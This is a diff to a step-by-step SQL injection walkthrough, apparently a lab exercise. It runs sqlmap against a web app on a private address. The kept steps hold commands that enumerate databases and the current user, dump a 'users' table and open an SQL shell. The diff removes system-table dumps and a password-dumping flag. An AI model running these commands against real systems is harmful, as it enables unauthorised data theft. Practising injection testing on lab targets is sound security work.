@@ -24,24 +24,16 @@ curl 'http://172.25.32.1:8080/words?search=ab'
 7. Run Sqlmap against target.
 
 ```
-sqlmap -u 'http://172.25.32.1:8080/words?search=ab'
+sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --level=3
 ```
 
-8. If unsuccessful, run again increasing level and risk.
-
-```
-sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --level=3 --risk=3
-```
-
-9. After successful found of vulnerable parameter, list databases, tables and dump content.
+8. After successful found of vulnerable parameter, list databases, tables and dump content.
 
 ```
 sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --dbs --current-user --current-db
-sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D mysql --tables
-sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D mysql -T user --dump
 sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D example --tables
-sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D example -T users --dump --passwords
+sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D example -T users --dump
 sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --sql-shell
 ```
 
-10. It is possible to use POST requests too. But it will polute the database and will be much slower.
+9. It is possible to use POST requests too. But it will polute the database and will be much slower.
